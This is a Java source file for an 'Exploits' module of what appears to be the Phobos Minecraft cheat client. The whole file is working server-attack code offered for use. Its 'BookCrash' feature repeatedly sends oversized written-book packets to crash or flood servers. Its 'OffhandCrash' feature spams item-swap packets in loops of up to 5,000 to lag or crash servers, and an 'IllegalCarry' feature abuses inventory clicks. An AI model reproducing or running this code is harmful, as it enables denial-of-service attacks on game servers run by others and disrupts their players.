



package me.earth.phobos.features.modules.misc;

import me.earth.phobos.features.modules.*;
import me.earth.phobos.features.setting.*;
import net.minecraft.network.*;
import net.minecraft.network.play.*;
import net.minecraft.util.math.*;
import net.minecraft.util.*;
import net.minecraft.client.multiplayer.*;
import net.minecraft.client.gui.*;
import me.earth.phobos.event.events.*;
import net.minecraft.network.play.server.*;
import net.minecraft.init.*;
import net.minecraft.item.*;
import net.minecraft.nbt.*;
import net.minecraft.network.play.client.*;
import java.util.*;
import net.minecraftforge.fml.common.gameevent.*;
import org.lwjgl.input.*;
import net.minecraft.client.gui.inventory.*;
import net.minecraft.entity.player.*;
import net.minecraft.inventory.*;
import net.minecraftforge.fml.common.eventhandler.*;

public class Exploits extends Module
{
    public Setting<Boolean> illegalCarry;
    public Setting<Bind> toXCarry;
    public Setting<Bind> fromXCarry;
    public Setting<Boolean> bookCrash;
    public Setting<Mode> mode;
    public Setting<Integer> delay;
    public Setting<Integer> strLength;
    public Setting<Boolean> offhandCrash;
    private final Setting<Boolean> antilag;
    private final Setting<Boolean> docrash;
    private final Setting<Integer> loopzz;
    private Packet<INetHandlerPlayServer> packet;
    private String pages;
    private boolean flag;
    
    public Exploits() {
        super("Exploits",  "Some exploits.",  Category.MISC,  true,  false,  false);
        this.illegalCarry = (Setting<Boolean>)this.register(new Setting("IllegalCarry", false));
        this.toXCarry = (Setting<Bind>)this.register(new Setting("ToXCarry", new Bind(-1),  v -> this.illegalCarry.getValue()));
        this.fromXCarry = (Setting<Bind>)this.register(new Setting("FromXCarry", new Bind(-1),  v -> this.illegalCarry.getValue()));
        this.bookCrash = (Setting<Boolean>)this.register(new Setting("BookCrash", false));
        this.mode = (Setting<Mode>)this.register(new Setting("Mode", Mode.WindowClick,  v -> this.bookCrash.getValue()));
        this.delay = (Setting<Integer>)this.register(new Setting("Delay", 5, 1, 500,  v -> this.bookCrash.getValue()));
        this.strLength = (Setting<Integer>)this.register(new Setting("Length", 600, 100, 655,  v -> this.bookCrash.getValue()));
        this.offhandCrash = (Setting<Boolean>)this.register(new Setting("OffhandCrash", false));
        this.antilag = (Setting<Boolean>)this.register(new Setting("AntiOffhandCrash", true,  v -> this.offhandCrash.getValue()));
        this.docrash = (Setting<Boolean>)this.register(new Setting("Use Offhand Crash", true,  v -> this.offhandCrash.getValue()));
        this.loopzz = (Setting<Integer>)this.register(new Setting("Times to loop", 500, 100, 5000,  v -> this.offhandCrash.getValue()));
        this.pages = "";
        this.flag = true;
    }
    
    @Override
    public void onEnable() {
        if (this.bookCrash.getValue()) {
            this.pages = this.genRandomString(this.strLength.getValue());
            this.runThread();
            this.flag = true;
        }
    }
    
    @Override
    public void onDisable() {
        if (this.bookCrash.getValue()) {
            this.pages = "";
            this.flag = false;
        }
    }
    
    @Override
    public void onUpdate() {
        if (this.offhandCrash.getValue()) {
            if (this.docrash.getValue()) {
                for (int i = 0; i < this.loopzz.getValue(); ++i) {
                    final BlockPos playerBlock = new BlockPos(Exploits.mc.player.posX,  Exploits.mc.player.posY - 1.0,  Exploits.mc.player.posZ);
                    Exploits.mc.player.connection.sendPacket((Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS,  playerBlock,  EnumFacing.UP));
                }
            }
            if ((Exploits.mc.currentScreen instanceof GuiMainMenu || Exploits.mc.currentScreen instanceof GuiDisconnected || Exploits.mc.currentScreen instanceof GuiDownloadTerrain || Exploits.mc.currentScreen instanceof GuiConnecting || Exploits.mc.currentScreen instanceof GuiMultiplayer) && this.isEnabled()) {
                this.toggle();
            }
        }
    }
    
    @SubscribeEvent
    public void onPacketSend(final PacketEvent.Send event) {
        if (this.offhandCrash.getValue() && this.antilag.getValue() && event.getPacket() instanceof SPacketSoundEffect && ((SPacketSoundEffect)event.getPacket()).getSound() == SoundEvents.ITEM_ARMOR_EQUIP_GENERIC) {
            event.setCanceled(true);
        }
    }
    
    @Override
    public void onLogout() {
        this.disable();
    }
    
    private void runThread() {
        ItemStack bookObj;
        NBTTagList list;
        NBTTagCompound tag;
        String author;
        int i;
        NBTTagString tString;
        new Thread(() -> {
            try {
                bookObj = new ItemStack(Items.WRITABLE_BOOK);
                list = new NBTTagList();
                tag = new NBTTagCompound();
                author = Exploits.mc.getSession().getUsername();
                for (i = 0; i < 50; ++i) {
                    tString = new NBTTagString(this.pages);
                    list.appendTag((NBTBase)tString);
                }
                tag.setString("author",  author);
                tag.setString("title",  "\n ZimCRASH \n");
                tag.setTag("pages",  (NBTBase)list);
                bookObj.setTagInfo("pages",  (NBTBase)list);
                bookObj.setTagCompound(tag);
                if (this.mode.getValue() == Mode.ConsoleSpammer) {
                    this.pages = this.genRandomString(8192);
                    this.strLength.setValue(8192);
                    this.delay.setValue(225);
                }
                while (this.flag) {
                    switch (this.mode.getValue()) {
                        case CreativeInventory: {
                            this.packet = (Packet<INetHandlerPlayServer>)new CPacketCreativeInventoryAction(0,  bookObj);
                        }
                        case WindowClick: {
                            this.packet = (Packet<INetHandlerPlayServer>)new CPacketClickWindow(0,  0,  0,  ClickType.PICKUP,  bookObj,  (short)0);
                        }
                        case ConsoleSpammer: {
                            this.packet = (Packet<INetHandlerPlayServer>)new CPacketClickWindow(0,  0,  0,  ClickType.PICKUP,  bookObj,  (short)0);
                            break;
                        }
                    }
                    Exploits.mc.player.connection.sendPacket((Packet)this.packet);
                    try {
                        Thread.sleep(this.delay.getValue());
                    }
                    catch (Exception e2) {
                        Thread.interrupted();
                    }
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    private String genRandomString(final Integer Length) {
        final String SALTCHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        final StringBuilder salt = new StringBuilder();
        final Random rnd = new Random();
        while (salt.length() < Length) {
            final int index = (int)(rnd.nextFloat() * SALTCHARS.length());
            salt.append(SALTCHARS.charAt(index));
        }
        return salt.toString();
    }
    
    @SubscribeEvent(priority = EventPriority.NORMAL,  receiveCanceled = true)
    public void onKeyInput(final InputEvent.KeyInputEvent event) {
        if (this.illegalCarry.getValue() && Keyboard.getEventKeyState() && Exploits.mc.currentScreen instanceof GuiContainer) {
            if (this.toXCarry.getValue().getKey() == Keyboard.getEventKey()) {
                final GuiContainer container2 = (GuiContainer)Exploits.mc.currentScreen;
                final Slot slot2 = container2.getSlotUnderMouse();
                if (slot2 != null) {
                    Exploits.mc.playerController.windowClick(container2.inventorySlots.windowId,  slot2.getSlotIndex(),  0,  ClickType.PICKUP,  (EntityPlayer)Exploits.mc.player);
                    Exploits.mc.playerController.windowClick(container2.inventorySlots.windowId,  -999,  0,  ClickType.QUICK_CRAFT,  (EntityPlayer)Exploits.mc.player);
                    Exploits.mc.playerController.windowClick(0,  1,  1,  ClickType.QUICK_CRAFT,  (EntityPlayer)Exploits.mc.player);
                    Exploits.mc.playerController.windowClick(container2.inventorySlots.windowId,  -999,  2,  ClickType.QUICK_CRAFT,  (EntityPlayer)Exploits.mc.player);
                }
            }
            else {
                final GuiContainer container3;
                final Slot slot3;
                if (this.fromXCarry.getValue().getKey() == Keyboard.getEventKey() && (slot3 = (container3 = (GuiContainer)Exploits.mc.currentScreen).getSlotUnderMouse()) != null) {
                    Exploits.mc.playerController.windowClick(0,  1,  0,  ClickType.PICKUP,  (EntityPlayer)Exploits.mc.player);
                    Exploits.mc.playerController.windowClick(0,  -999,  0,  ClickType.QUICK_CRAFT,  (EntityPlayer)Exploits.mc.player);
                    Exploits.mc.playerController.windowClick(container3.inventorySlots.windowId,  slot3.getSlotIndex(),  1,  ClickType.QUICK_CRAFT,  (EntityPlayer)Exploits.mc.player);
                    Exploits.mc.playerController.windowClick(0,  -999,  2,  ClickType.QUICK_CRAFT,  (EntityPlayer)Exploits.mc.player);
                }
            }
        }
    }
    
    private enum Mode
    {
        CreativeInventory,  
        WindowClick,  
        ConsoleSpammer;
    }
}
